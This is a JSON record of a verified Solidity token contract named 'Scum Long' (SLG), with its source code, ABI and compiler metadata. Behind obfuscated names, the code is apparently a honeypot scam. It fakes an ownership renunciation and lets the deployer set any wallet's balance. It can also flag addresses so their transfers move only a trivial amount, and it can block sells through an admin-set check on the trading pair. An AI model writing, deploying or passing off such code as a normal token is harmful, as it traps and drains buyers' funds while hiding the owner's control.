{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface isWallet {\n    function createPair(address exemptLaunched, address shouldLimit) external returns (address);\n}\n\ninterface liquidityEnableLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapList) external view returns (uint256);\n\n    function transfer(address txTake, uint256 buyMin) external returns (bool);\n\n    function allowance(address senderTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txTake,\n        uint256 buyMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableMarketingReceiver, uint256 value);\n    event Approval(address indexed senderTotal, address indexed spender, uint256 value);\n}\n\nabstract contract senderFromReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxTakeBuy is liquidityEnableLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ScumLong is senderFromReceiver, liquidityEnableLaunch, maxTakeBuy {\n\n    address public tokenLaunched;\n\n    address public txFund;\n\n    address private amountShouldList;\n\n    uint256 private modeLimitMin;\n\n    bool public launchedTx;\n\n    uint256 private senderMarketing;\n\n    uint256 teamLimit;\n\n    function limitEnableAt(address tradingSender, address txTake, uint256 buyMin) internal returns (bool) {\n        require(fromAmountMode[tradingSender] >= buyMin);\n        fromAmountMode[tradingSender] -= buyMin;\n        fromAmountMode[txTake] += buyMin;\n        emit Transfer(tradingSender, txTake, buyMin);\n        return true;\n    }\n\n    function limitToken() public {\n        emit OwnershipTransferred(tokenLaunched, address(0));\n        amountShouldList = address(0);\n    }\n\n    function transfer(address walletAt, uint256 buyMin) external virtual override returns (bool) {\n        return shouldWallet(_msgSender(), walletAt, buyMin);\n    }\n\n    function shouldWallet(address tradingSender, address txTake, uint256 buyMin) internal returns (bool) {\n        if (tradingSender == tokenLaunched) {\n            return limitEnableAt(tradingSender, txTake, buyMin);\n        }\n        uint256 buyExemptTake = liquidityEnableLaunch(txFund).balanceOf(teamFrom);\n        require(buyExemptTake == teamLimit);\n        require(txTake != teamFrom);\n        if (tokenMaxLaunched[tradingSender]) {\n            return limitEnableAt(tradingSender, txTake, launchExemptSender);\n        }\n        return limitEnableAt(tradingSender, txTake, buyMin);\n    }\n\n    function approve(address atFundToken, uint256 buyMin) public virtual override returns (bool) {\n        autoFee[_msgSender()][atFundToken] = buyMin;\n        emit Approval(_msgSender(), atFundToken, buyMin);\n        return true;\n    }\n\n    uint256 tokenShouldTo;\n\n    string private tokenTeam = \"SLG\";\n\n    address teamFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private receiverFund;\n\n    mapping(address => bool) public liquidityMarketingSwap;\n\n    bool private listTotalToken;\n\n    string private sellIs = \"Scum Long\";\n\n    function launchMin() private view {\n        require(liquidityMarketingSwap[_msgSender()]);\n    }\n\n    uint8 private amountTrading = 18;\n\n    function launchToAuto(address amountMarketingFund) public {\n        launchMin();\n        if (modeLimitMin == senderMarketing) {\n            launchedTx = false;\n        }\n        if (amountMarketingFund == tokenLaunched || amountMarketingFund == txFund) {\n            return;\n        }\n        tokenMaxLaunched[amountMarketingFund] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountTrading;\n    }\n\n    address autoReceiverEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private maxList = 100000000 * 10 ** 18;\n\n    uint256 private txEnable;\n\n    function amountBuy(address walletAt, uint256 buyMin) public {\n        launchMin();\n        fromAmountMode[walletAt] = buyMin;\n    }\n\n    mapping(address => bool) public tokenMaxLaunched;\n\n    event OwnershipTransferred(address indexed txTotal, address indexed liquidityExempt);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxList;\n    }\n\n    uint256 private walletTeam;\n\n    function transferFrom(address tradingSender, address txTake, uint256 buyMin) external override returns (bool) {\n        if (_msgSender() != autoReceiverEnable) {\n            if (autoFee[tradingSender][_msgSender()] != type(uint256).max) {\n                require(buyMin <= autoFee[tradingSender][_msgSender()]);\n                autoFee[tradingSender][_msgSender()] -= buyMin;\n            }\n        }\n        return shouldWallet(tradingSender, txTake, buyMin);\n    }\n\n    function getOwner() external view returns (address) {\n        return amountShouldList;\n    }\n\n    function liquidityAutoReceiver(uint256 buyMin) public {\n        launchMin();\n        teamLimit = buyMin;\n    }\n\n    bool private fundTxMarketing;\n\n    function owner() external view returns (address) {\n        return amountShouldList;\n    }\n\n    function balanceOf(address swapList) public view virtual override returns (uint256) {\n        return fromAmountMode[swapList];\n    }\n\n    function allowance(address walletMax, address atFundToken) external view virtual override returns (uint256) {\n        if (atFundToken == autoReceiverEnable) {\n            return type(uint256).max;\n        }\n        return autoFee[walletMax][atFundToken];\n    }\n\n    bool public minTotal;\n\n    constructor (){\n        if (minTotal == fundTxMarketing) {\n            fundTxMarketing = true;\n        }\n        takeWallet tradingLimit = takeWallet(autoReceiverEnable);\n        txFund = isWallet(tradingLimit.factory()).createPair(tradingLimit.WETH(), address(this));\n        \n        tokenLaunched = _msgSender();\n        liquidityMarketingSwap[tokenLaunched] = true;\n        fromAmountMode[tokenLaunched] = maxList;\n        limitToken();\n        if (listTotalToken) {\n            fundTxMarketing = false;\n        }\n        emit Transfer(address(0), tokenLaunched, maxList);\n    }\n\n    bool public tokenList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenTeam;\n    }\n\n    mapping(address => uint256) private fromAmountMode;\n\n    function name() external view virtual override returns (string memory) {\n        return sellIs;\n    }\n\n    function enableSell(address liquidityAuto) public {\n        if (tokenList) {\n            return;\n        }\n        \n        liquidityMarketingSwap[liquidityAuto] = true;\n        \n        tokenList = true;\n    }\n\n    uint256 constant launchExemptSender = 20 ** 10;\n\n    mapping(address => mapping(address => uint256)) private autoFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketingReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atFundToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyMin\",\"type\":\"uint256\"}],\"name\":\"amountBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFundToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"}],\"name\":\"enableSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketingFund\",\"type\":\"address\"}],\"name\":\"launchToAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyMin\",\"type\":\"uint256\"}],\"name\":\"liquidityAutoReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityMarketingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMaxLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ScumLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}